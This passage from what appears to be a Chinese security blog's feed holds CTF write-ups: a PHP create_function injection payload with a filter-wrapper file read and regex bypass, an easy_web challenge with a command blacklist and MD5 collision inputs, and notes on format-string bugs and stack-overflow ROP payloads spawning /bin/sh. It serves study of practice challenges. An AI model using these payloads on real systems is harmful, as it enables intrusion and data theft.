class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) ||</span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$code</code>和<code>$arg</code>可控，利用<code>$code(&#39;&#39;,$arg)</code>进行create_function注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function a(&#x27;&#x27;,$arg)&#123;</span><br><span class="line">    return $arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$arg=}代码;//,则}闭合了a()，同时//注释了后面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function a(&#x27;&#x27;,$arg)&#123;</span><br><span class="line">    return &#125;代码;//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造<code>flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code></p><p><code>get_defined_vars()</code>打印出所有定义的变量与变量值</p><p>payload应为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=&#125;;var_dump(get_defined_vars());//</span><br><span class="line">post: file=1&amp;debu=2</span><br></pre></td></tr></table></figure><p>最后的flag在rea1fl4g.php中，使用require加base64编码加取反替代<code>var_dump(get_defined_vars())</code><br><code>require(php://filter/convert.base64-encode/resource=rea1fl4g.php)</code></p><p>用require读取flag，用~绕过正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">#%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1nD3x.php?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=&#125;;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure><p>同时post<code>file=1&amp;debu=2</code></p><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h3 id="未完成"><a href="#未完成" class="headerlink" title="未完成"></a>未完成</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>至于md5碰撞的话，本来可以用数组绕过，但是这里使用了（String）强制转换，数组被强制转换的结果都为<code>string(5) &quot;Array&quot;</code></p><h3 id="MD5强碰撞"><a href="#MD5强碰撞" class="headerlink" title="MD5强碰撞"></a>MD5强碰撞</h3><p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=QNKCDZO&amp;param2=aabg7XSs</span><br></pre></td></tr></table></figure><p>两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=<span class="number">111</span>&amp;param2[]=<span class="number">222</span></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5碰撞的例子</a></p><h6 id="hex2bin-py"><a href="#hex2bin-py" class="headerlink" title="hex2bin.py"></a>hex2bin.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br><span class="line">hexList1 = []</span><br><span class="line">intList1 = []</span><br><span class="line">asciiString1 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString1 = hexString1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString1 = hexString1[<span class="number">2</span>:]</span><br><span class="line">    hexList1.append(intString1)</span><br><span class="line">    <span class="keyword">if</span> (hexString1 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList1:</span><br><span class="line">    intList1.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList1:</span><br><span class="line">    asciiString1 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString1)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">hexList2 = []</span><br><span class="line">intList2 = []</span><br><span class="line">asciiString2 =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    intString2 = hexString2[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    hexString2 = hexString2[<span class="number">2</span>:]</span><br><span class="line">    hexList2.append(intString2)</span><br><span class="line">    <span class="keyword">if</span> (hexString2 == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hexList2:</span><br><span class="line">    intList2.append(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> intList2:</span><br><span class="line">    asciiString2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(j))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;2.bin&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(asciiString2)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Buuctf </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2021/12/07/PWN/pwn%E6%BC%8F%E6%B4%9E/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2021/12/07/PWN/pwn%E6%BC%8F%E6%B4%9E/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>printf函数输入流程 : </p><p>函数首先会获取第一个参数,也就是格式化字符串,依次读取格式化字符串的每一个字符,如果是%,则继续读取下一个空字符,获取对应的参数解析并输出,如果该字符不为%,则直接输出到标准输出.</p><p><code>printf(&quot;My name is %s,I&#39;m %d years old\n&quot;,&quot;otto&quot;,19)</code></p><p>c语言printf格式化字符串的基本格式如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">parameter可以忽略n$,或者用来获取格式化字符串的指定参数例如</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0x11</span>,b=<span class="number">0x22</span>,c=<span class="number">0x33</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$p&quot;</span>,a,b,c);</span><br><span class="line"><span class="comment">//output: 0x33</span></span><br><span class="line">flag</span><br><span class="line">field width</span><br><span class="line">输出的最小宽度</span><br><span class="line">precision</span><br><span class="line">输出的最大长度</span><br><span class="line">length，输出的长度</span><br><span class="line">hh，输出一个字节</span><br><span class="line">h，输出一个双字节</span><br><span class="line">type</span><br><span class="line">d/i，有符号整数</span><br><span class="line">u，无符号整数</span><br><span class="line">x/X，<span class="number">16</span> 进制 <span class="keyword">unsigned</span> <span class="keyword">int</span> 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 <span class="number">0</span>。默认精度为 <span class="number">1</span>。精度为 <span class="number">0</span> 且值为 <span class="number">0</span>，则输出为空。</span><br><span class="line">o，<span class="number">8</span> 进制 <span class="keyword">unsigned</span> <span class="keyword">int</span> 。如果指定了精度，则输出的数字不足时在左侧补 <span class="number">0</span>。默认精度为 <span class="number">1</span>。精度为 <span class="number">0</span> 且值为 <span class="number">0</span>，则输出为空。</span><br><span class="line">s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 <span class="keyword">wchar_t</span> 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</span><br><span class="line">c，如果没有用 l 标志，把 <span class="keyword">int</span> 参数转为 <span class="keyword">unsigned</span> <span class="keyword">char</span> 型输出；如果用了 l 标志，把 <span class="keyword">wint_t</span> 参数转为包含两个元素的 <span class="keyword">wchart_t</span> 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</span><br><span class="line">p， <span class="keyword">void</span> * 型，输出对应变量的值。<span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,a) 用地址的格式打印变量 a 的值，<span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;a) 打印变量 a 所在的地址。</span><br><span class="line">n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br><span class="line">%， <span class="string">&#x27;%&#x27;</span>字面值，不接受任何 flags, width。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWN漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出和ROP</title>
      <link href="/2021/12/07/PWN/pwn%E6%BC%8F%E6%B4%9E/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8CROP/"/>
      <url>/2021/12/07/PWN/pwn%E6%BC%8F%E6%B4%9E/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%92%8CROP/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line"><span class="comment"># .plt:08048460                   ; [00000006 BYTES: COLLAPSED FUNCTION _gets. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line"><span class="comment"># .plt:08048490                   ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line"><span class="comment"># pop     ebx</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br></pre></td></tr></table></figure><h1 id="栈溢出和ROP"><a href="#栈溢出和ROP" class="headerlink" title="栈溢出和ROP"></a>栈溢出和ROP</h1><p><code>栈</code>:一种先进后出的数据结构。常见操作有两种，进栈(PUSH) 和弹栈(POP),用于标识栈的属性有两个，一个是栈顶(TOP)，一个是栈底（BASE）</p><p>程序中的栈:</p><p>内存中的一块区域，用栈的结构来管理，从高地址向低地址增长</p><p>寄存器<code>esp代表栈顶（即最低栈地址）</code></p><p>栈操作</p><p>压栈（入栈）push sth-&gt; [esp]=sth,esp=esp-4</p><p>弹栈（出栈）pop sth-&gt; sth=[esp],esp=esp+4</p><p>栈用于<code>保存函数调用信息和局部变量</code></p><p><strong>函数调用</strong></p><p>如何通过系统栈进行函数的调用和递归</p><p><strong>函数调用指令: call ret</strong></p><h2 id="函数调用时栈的变化"><a href="#函数调用时栈的变化" class="headerlink" title="函数调用时栈的变化"></a>函数调用时栈的变化</h2><p>大致过程:</p><p>参数入栈</p><p>返回地址入栈</p><p>代码区块跳转</p><p>栈帧调整:</p><p>保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)；</p><p>将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)</p><p>给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push  参数 3               #参数由右向左入栈</span><br><span class="line">push 参数 2</span><br><span class="line">push 参数 1</span><br><span class="line">call 函数地址    #push当前指令位置，跳转到所调用函数的入口地址</span><br><span class="line">push ebp         #保存旧栈帧的底部</span><br><span class="line">mov ebp,esp    #设置新栈帧底部</span><br><span class="line">sub esp ,xxx      #设置新栈帧顶部</span><br></pre></td></tr></table></figure><p>参数传参:取决于调用约定，一般情况下:</p><p>X86 从右向左入栈，X64 优先寄存器，参数过多(6个以上)时才入栈</p><p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a>讲栈的调用非常好</p><p><code>调用时主要变化要点就是保存调用函数,同时创建被调用函数的状态</code></p><p>1.函数调用开始时,将被<strong>调用函数(callee)的参数逆序保存在栈</strong>中,如果没有就参数就不需要,这些参数仍需保存在调用函数(caller)的函数状态内,之后压入栈内的数据都会作为被调用函数(callee)的函数状态来保存。<code>将被调用参数压栈</code></p><p>2.,然后将<strong>调用函数（caller）进行调用之后的下一条指令地址</strong>作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<code>将被调用函数的返回地址压入栈内</code></p><p>3.再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。</p><p>4.将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内,再之后是将被调用函数（callee）的局部变量等数据压入栈内。</p><p><strong>寄存器</strong></p><p>重要的寄存器：rsp/esp, pc, rbp/ebp, rax/eax, rdi, rsi, rdx, rcx</p><p>ESP: 栈指针寄存器，内存存放着一个指针，指针指向系统栈最上面一个栈帧的底部</p><p>EBP:基址指针寄存器，存放着一个指针，指针指向系统栈最上面的一个栈帧底部</p><p><img src="https://p5.ssl.qhimg.com/t01e8b20fe6caa31658.jpg" alt="http://p9.qhimg.com/t011e10c089bb2fa12a.jpg"></p><p><code>栈溢出</code>的原理就是不顾堆栈中分配的局部数据块大小，向该数据快写入了过多的数据，导致数据越界，结果覆盖来看老的堆栈数据。</p><p><strong>栈溢出的保护机制</strong></p><p><strong>栈上的数据无法被当作指令来执行</strong></p><p>数据执行保护(NX/DEP)</p><p>绕过方法ROP</p><p><strong>难以找到想要找的地址</strong></p><p>地址空间布局随机化(ASLR)</p><p>绕过方法:infoleak 、retdlresolve 、ROP</p><p><strong>检测栈数据是否被修改</strong></p><p>Stack Canary/ Cookie</p><p>绕过方法: infoleak</p><p><code>CTF 常用套路: 栈溢出的利用方法</code></p><p>现代栈溢出利用技术基础：ROP</p><p>利用signal机制的ROP技术：SROP</p><p>没有binary怎么办：BROP 、dump bin</p><p>劫持栈指针：stack pivot</p><p>利用动态链接绕过ASLR：ret2dl resolve、fake linkmap</p><p>利用地址低12bit绕过ASLR：Partial Overwrite</p><p>绕过stack canary：改写指针与局部变量、leak canary、overwrite canary</p><p>溢出位数不够怎么办：覆盖ebp，Partial Overwrite</p><p>现代栈溢出利用技术基础:ROP</p><h2 id="ctf中的ROP的套路"><a href="#ctf中的ROP的套路" class="headerlink" title="ctf中的ROP的套路"></a>ctf中的ROP的套路</h2><p>说了这么多,rop是什么?</p><p>ROP是(Return Oriented Programming),主要是在栈溢出的基础上,利用程序中已有的小片段(gadgets),来改变某些寄存器或者变量的值,从而控制程序的执行流，gadgets就是以ret结尾的指令序列，通过这些指令序列进行修改程序。</p><p>ROP攻击满足条件：</p><ul><li>程序可能存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的gadgets以及对应的地址</li></ul><p>ret2text</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jarvisoj_level2</span></span><br><span class="line"><span class="comment">//该程序存在binsh字符串</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line">    system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>,&amp;buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    backdoor();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read存在栈溢出,且存在/bin/sh字符串</p><p><code>思路</code>:覆盖返回地址为system_plt,并根据32位的参数传参数binsh</p><p>payload:<code>&#39;a&#39;*0x88+&#39;b&#39;*4+system_plt+&#39;c&#39;*4+binsh_addr</code></p><p>解释:padding+覆盖ebp+覆盖返回地址+函数调用返回地址+system函数参数</p><p>该c*4可以改为main函数的地址,这样就可以反复触发漏洞</p><p><code>如果是64位呢?</code></p><p>64位首先要先使用寄存器(依次位rdi,rsi,rdx,rcx,r8,r9),当参数超出6个时才会用栈.</p><p><code>思路</code>:覆盖返回地址为system_plt,并根据64位的参数传递规则设置参数.</p><p>我们需要rdi指向binsh,所以我们需要找到pop rdi的地址(可以使用ropper或Ropgadget)</p><p>payload:<code>&#39;a&#39;*0x80+&#39;b&#39;*8+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</code></p><p>ret2shellcode</p><p>即控制程序执行shellcode代码,shellcode用于完成某些功能的汇编代码,常见的就是获取shell,一般shellcode需要我们自己填充,注意,shellcode所在区域需要有可执行权限.</p><figure class="highlight 